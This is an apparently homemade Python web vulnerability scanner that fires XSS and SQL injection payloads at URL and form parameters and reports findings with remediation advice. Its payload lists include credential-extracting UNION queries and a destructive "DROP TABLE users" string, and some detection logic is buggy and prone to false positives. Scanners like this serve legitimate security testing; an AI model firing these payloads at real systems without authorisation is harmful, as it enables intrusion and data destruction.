import requests
import time


# --------------------------------
# Session + Headers (speed boost)
# --------------------------------
session = requests.Session()

HEADERS = {
    "User-Agent": "DSG-Scanner/1.0"
}


# -------------------------
# XSS Payloads
# -------------------------
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "'><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>"
]


# -------------------------
# SQL Payloads
# -------------------------
SQL_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "\" OR \"1\"=\"1\"--",
    "' OR 1=1#",
    "' OR '1'='1'",
    "' OR '1'='2'--",
    "' AND 1=2--",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username, password FROM users--",
    "' OR EXISTS(SELECT * FROM users)--",
    "'; DROP TABLE users--",
    "' AND 1=0 UNION SELECT username, password FROM users--",
    "admin' --",
    "admin' #"
]


# -------------------------
# SQL Error Signatures
# -------------------------
SQL_ERRORS = [
    "SQL syntax",
    "mysql_fetch",
    "ORA-01756",
    "ORA-00933",
    "syntax error",
    "Unclosed quotation mark",
    "SQLite error",
    "Warning: mysql",
    "PostgreSQL",
    "Microsoft OLE DB Provider for SQL Server",
    "JDBC",
    "SQLSTATE",
    "SQLServerException"
]


# -------------------------
# Time-based SQL payloads
# -------------------------
TIME_SQL_PAYLOADS = [
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR pg_sleep(5)--",
    "' OR BENCHMARK(1000000,MD5(1))--",
    "1; SELECT pg_sleep(5)--",
    "'; SELECT SLEEP(5)--"
]


# -------------------------
# Boolean-based SQL payload pairs
# -------------------------
BOOLEAN_SQL_PAIRS = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("\" AND 1=1--", "\" AND 1=2--"),
    ("' OR '1'='1'--", "' OR '1'='2'--")
]


# --------------------------------
# Helper: Build payload URL safely
# --------------------------------
def build_url(url, param, payload):

    if "?" in url:
        return f"{url}&{param}={payload}"
    else:
        return f"{url}?{param}={payload}"


# -------------------------
# Time-based SQL Injection
# -------------------------
def test_time_sql(url, params):

    vulns = []

    for param in params:

        for payload in TIME_SQL_PAYLOADS:

            test_url = build_url(url, param, payload)

            try:

                start = time.time()

                session.get(test_url, headers=HEADERS, timeout=10)

                elapsed = time.time() - start

                if elapsed > 5:

                    vulns.append({
                        "type": "Time-based SQL Injection",
                        "parameter": param,
                        "payload": payload,
                        "url": test_url,
                        "explanation": "The response took significantly longer than expected, indicating the SQL payload caused a delay (e.g., SLEEP function), confirming blind SQL injection vulnerability.",
                        "severity": "High",
                        "remediation": "Use prepared statements and avoid dynamic SQL queries with user input."
                    })

            except:
                pass

    return vulns


# -------------------------
# XSS Testing
# -------------------------
def test_xss(url, parameters):

    vulnerabilities = []

    for param in parameters:

        for payload in XSS_PAYLOADS:

            try:

                test_url = build_url(url, param, payload)

                response = session.get(test_url, headers=HEADERS, timeout=5)

                if payload in response.text:

                    vulnerabilities.append({
                        "type": "Reflected XSS",
                        "parameter": param,
                        "payload": payload,
                        "url": test_url,
                        "explanation": "The XSS payload was reflected in the server's response without proper HTML encoding or sanitization, allowing potential script execution in the user's browser.",
                        "severity": "High",
                        "remediation": "Implement output encoding (e.g., HTML entity encoding) or use a library like DOMPurify to sanitize user inputs."
                    })

            except:
                pass

    return vulnerabilities


# -------------------------
# SQL Injection Testing
# -------------------------
def test_sql(url, parameters):

    vulnerabilities = []

    for param in parameters:

        # Baseline response for boolean comparison
        baseline_text = ""
        try:
            baseline_url = build_url(url, param, "test")
            baseline = session.get(baseline_url, headers=HEADERS, timeout=5)
            baseline_text = baseline.text
        except:
            pass

        # Traditional error-based and union-based payloads
        for payload in SQL_PAYLOADS:
            try:
                test_url = build_url(url, param, payload)
                response = session.get(test_url, headers=HEADERS, timeout=5)

                lower_text = response.text.lower()

                for error in SQL_ERRORS:
                    if error.lower() in lower_text:
                        vulnerabilities.append({
                            "type": "Error-based SQL Injection",
                            "parameter": param,
                            "payload": payload,
                            "url": test_url,
                            "evidence": error,
                            "explanation": f"An SQL error ('{error}') was triggered by the payload, indicating the application is vulnerable to SQL injection via error-based payloads.",
                            "severity": "Critical",
                            "remediation": "Use prepared statements or parameterized queries, and validate/sanitize all user inputs."
                        })
                        break

                # Quick content-based truthy condition detection
                if "union select" in lower_text or "select" in lower_text and "from" in lower_text:
                    vulnerabilities.append({
                        "type": "Union-based SQL Injection",
                        "parameter": param,
                        "payload": payload,
                        "url": test_url,
                        "evidence": "Possible UNION query output in response",
                        "explanation": "The response indicates SELECT data may be returned directly from the database in response to injection payloads.",
                        "severity": "High",
                        "remediation": "Use parameterized queries and strict output encoding."
                    })

            except:
                pass

        # Boolean-based blind SQLi checks
        for true_payload, false_payload in BOOLEAN_SQL_PAIRS:
            try:
                true_url = build_url(url, param, true_payload)
                false_url = build_url(url, param, false_payload)

                true_resp = session.get(true_url, headers=HEADERS, timeout=5)
                false_resp = session.get(false_url, headers=HEADERS, timeout=5)

                if true_resp.status_code == false_resp.status_code == 200:
                    len_diff = abs(len(true_resp.text) - len(false_resp.text))
                    if baseline_text:
                        baseline_len = len(baseline_text)
                        if baseline_len > 0 and (len(true_resp.text) != len(false_resp.text)):
                            vulnerabilities.append({
                                "type": "Boolean-based SQL Injection",
                                "parameter": param,
                                "payload": f"{true_payload} / {false_payload}",
                                "url": true_url,
                                "evidence": f"Response length true={len(true_resp.text)} false={len(false_resp.text)}",
                                "explanation": "Different behavior between true/false SQL conditions suggests the application is taking injected SQL into account.",
                                "severity": "High",
                                "remediation": "Validate inputs and use prepared statements with parameter binding."
                            })
                            break
                    elif len_diff > 50:
                        vulnerabilities.append({
                            "type": "Boolean-based SQL Injection",
                            "parameter": param,
                            "payload": f"{true_payload} / {false_payload}",
                            "url": true_url,
                            "evidence": f"Response length true={len(true_resp.text)} false={len(false_resp.text)}",
                            "explanation": "Different behavior between true/false SQL conditions suggests the application may be vulnerable.",
                            "severity": "High",
                            "remediation": "Validate inputs and use prepared statements with parameter binding."
                        })
                        break
            except:
                pass

    # Time-based SQLi checks
    vulnerabilities.extend(test_time_sql(url, parameters))

    return vulnerabilities


def test_sqli(url, parameters, method="get", data=None):

    vulnerabilities = []

    if method.lower() == "post":
        # POST-based SQLi payloads (non-GET vulnerable forms)
        for param in parameters:
            for payload in SQL_PAYLOADS:
                try:
                    form_data = {} if data is None else data.copy()
                    form_data[param] = payload

                    response = session.post(url, data=form_data, headers=HEADERS, timeout=5)
                    lower_text = response.text.lower()

                    for error in SQL_ERRORS:
                        if error.lower() in lower_text:
                            vulnerabilities.append({
                                "type": "Error-based SQL Injection",
                                "parameter": param,
                                "payload": payload,
                                "url": url,
                                "evidence": error,
                                "explanation": f"An SQL error ('{error}') was exposed on POST payload injection.",
                                "severity": "Critical",
                                "remediation": "Use prepared statements or parameterized queries and sanitize input."
                            })
                            break

                except:
                    pass

    # always include GET-style checks too (for links + derived endpoints)
    if method.lower() == "get":
        vulnerabilities.extend(test_sql(url, parameters))
    else:
        vulnerabilities.extend(test_time_sql(url, parameters))

    # include existing error-discovery routine for additional coverage
    vulnerabilities.extend(test_error_sql(url, parameters, method=method, data=data))

    return vulnerabilities


def test_error_sql(url, params, method='get', data=None):

    errors = [
        "SQL syntax",
        "mysql_fetch",
        "ORA-01756",
        "SQLite error",
        "UNEXPECTED TOKEN",
        "ODBC SQL Server Driver"
    ]
    

    vulns = []

    for p in params:

        try:
            if method.lower() == 'post':
                form_data = {} if data is None else data.copy()
                form_data[p] = "'"
                r = session.post(url, data=form_data, headers=HEADERS, timeout=5)
                test_url = url
            else:
                test_url = f"{url}&{p}='"
                r = requests.get(test_url, timeout=5)

            for e in errors:
                if e.lower() in r.text.lower():
                    vulns.append({
                        "parameter": p,
                        "type": "Error-based SQLi",
                        "url": test_url,
                        "explanation": f"An SQL error ('{e}') was revealed by injecting a single quote, indicating improper handling of user input in SQL queries.",
                        "severity": "Critical",
                        "remediation": "Use parameterized queries and input validation to prevent SQL injection."
                    })

        except:
            pass

    return vulns